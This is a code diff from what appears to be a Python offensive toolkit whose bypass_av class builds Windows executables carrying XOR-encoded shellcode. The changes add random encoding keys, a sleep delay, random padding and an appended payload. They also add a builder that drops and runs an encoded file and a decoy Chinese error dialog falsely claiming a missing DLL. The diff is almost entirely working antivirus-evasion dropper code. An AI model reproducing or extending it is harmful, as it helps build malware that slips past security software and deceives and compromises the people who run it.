@@ -483,6 +483,9 @@ def uuid():
 def rand_bytes(size):
     import secrets
     return secrets.token_bytes(size)
+    
+def rand_int(begin, end):
+    return random.randint(begin, end)
 
 def pause():
     sys.stdin.read()
@@ -1224,7 +1227,7 @@ class bypass_av(object):
     
     @staticmethod
     def gen(src, icon=None, libs=None, cmds=None):
-        src = gsub('@@@slot_\d+@@@', '', src).replace('@@@slot@@@', '')
+        src = gsub('@@@slot.*@@@', '', src)
         rm('@@@bypass_av@@@')
         md('@@@bypass_av@@@')
         cd('@@@bypass_av@@@')
@@ -1280,57 +1283,67 @@ class bypass_av(object):
     b2cs = bytes_to_c_str
         
     @staticmethod
-    def single_exe(sc, icon=None, modify=None, libs=None):
-        sc_key = rand_bytes(4)
-        sc = exor(sc, sc_key)
+    def single_exe(sc, icon=None, sleep=2000, modify=None, libs=None):
         if not bav.src:
             src = rd(r'D:\tools\bin\Lib\file_templete\bypass_av_single_exe.cpp', 'r')
         else:
             src = bav.src
-        src = src.replace('@@@slot_0@@@', bav.b2cs(sc_key))
-        src = src.replace('@@@slot_1@@@', str(len(sc)))
-        src = src.replace('@@@slot_2@@@', bav.b2cb(sc))
+            
+        sc_key = rand_bytes(rand_int(4, 8))
+        sc = exor(sc, sc_key)
+            
+        # decode shellcode at slot_1
+        slot_1 = r'decode(p_sc, sc_size, {}, {});'.format(bav.b2cs(sc_key), str(len(sc_key)))
+        
+        src = src.replace('@@@slot_0@@@', str(sleep))
+        src = src.replace('@@@slot_1@@@', slot_1)
+        src = src.replace('@@@slot_3@@@', str(rand_int(0, 0x1000)))
+        
         if modify:
             src = modify(src)
         if not libs:
             libs=['shlwapi']
         else:
             libs=['shlwapi']+libs
-        return bav.gen(src, icon, libs)
+        wt('@@@cc_shell_src@@@', 'w')(src)
+        return bav.gen(src, icon, libs)+p32(0)+sc+p32(len(sc))
     
     se = single_exe
     
     @staticmethod
-    def extract_and_exec_file_from_single_exe(sc, icon=None, file_tuple=None, modify=None, libs=None):
+    def extract_and_exec_file_from_single_exe(sc, icon=None, file_tuple=None, sleep=2000, modify=None, libs=None):
         if not file_tuple:
-            return bav.single_exe(sc, icon, modify, libs)
+            return bav.single_exe(sc, icon, sleep, modify, libs)
             
         file_bytes, file_ext_name = file_tuple[0], file_tuple[1]
-        slot_3 = bav.b2cb(file_bytes, 'file_data')+';'
-        slot_4 = r'write_temp_file_and_exec(file_data, sizeof(file_data), L"{}");'.format(file_ext_name)
+        file_key = rand_bytes(rand_int(4, 8))
+        file_bytes = exor(file_bytes, file_key)
+        
+        slot_2 = dtxt(b'H4sIAP7VBmMC/3MJ9w9yUUjLzEmNL86sSlWwVShKTUyJLwByc/JLNAx1FPxCfXw0rXm5AsL8PaEqUxJLEoEqE3Ny8pM14HpBitA1w5VrWgMAPyalt2oAAAA=')+'\n'
+        slot_2 += r'decode(file_data, file_size, {}, {});'.format(bav.b2cs(file_key), str(len(file_key))) + '\n'
+        slot_2 += r'write_temp_file_and_exec((unsigned char *)file_data, file_size, L"{}");'.format(file_ext_name) + '\n'
         def modify_(src):
-            src = src.replace('@@@slot_3@@@', slot_3)
-            src = src.replace('@@@slot_4@@@', slot_4)
+            src = src.replace('@@@slot_2@@@', slot_2)
             if modify:
                 src = modify(src)
             return src
         
-        return bav.single_exe(sc, icon, modify_, libs)
+        return bav.single_exe(sc, icon, sleep, modify_, libs)+file_bytes+p32(len(file_bytes))
         
     se_file = extract_and_exec_file_from_single_exe
     
     @staticmethod
-    def single_exe_with_msgbox(sc, icon=None, msg_tuple=None, modify=None, libs=None):
+    def single_exe_with_msgbox(sc, icon=None, msg_tuple=None, sleep=2000, modify=None, libs=None):
         if not msg_tuple:
             msg_tuple = [b'\xe7\xb3\xbb\xe7\xbb\x9f\xe9\x94\x99\xe8\xaf\xaf'.decode(), b'\xe7\x94\xb1\xe4\xba\x8e\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0api-ms-win-core-delayload-l1-1-0.dll, \xe6\x97\xa0\xe6\xb3\x95\xe7\xbb\xa7\xe7\xbb\xad\xe6\x89\xa7\xe8\xa1\x8c\xe4\xbb\xa3\xe7\xa0\x81, \xe9\x87\x8d\xe6\x96\xb0\xe5\xae\x89\xe8\xa3\x85\xe7\xa8\x8b\xe5\xba\x8f\xe5\x8f\xaf\xe8\x83\xbd\xe4\xbc\x9a\xe8\xa7\xa3\xe5\x86\xb3\xe6\xad\xa4\xe9\x97\xae\xe9\xa2\x98\xe3\x80\x82'.decode()]
-        slot_4 = rf'MessageBoxW(NULL, L"{msg_tuple[1]}", L"{msg_tuple[0]}", MB_ICONERROR|MB_OK);'
+        slot_2 = rf'MessageBoxW(NULL, L"{msg_tuple[1]}", L"{msg_tuple[0]}", MB_ICONERROR|MB_OK);'
         def modify_(src):
-            src = src.replace('@@@slot_4@@@', slot_4)
+            src = src.replace('@@@slot_2@@@', slot_2)
             if modify:
                 src = modify(src)
             return src
         
-        return bav.single_exe(sc, icon, modify_, libs)
+        return bav.single_exe(sc, icon, sleep, modify_, libs)
         
     se_msg = single_exe_with_msgbox
     
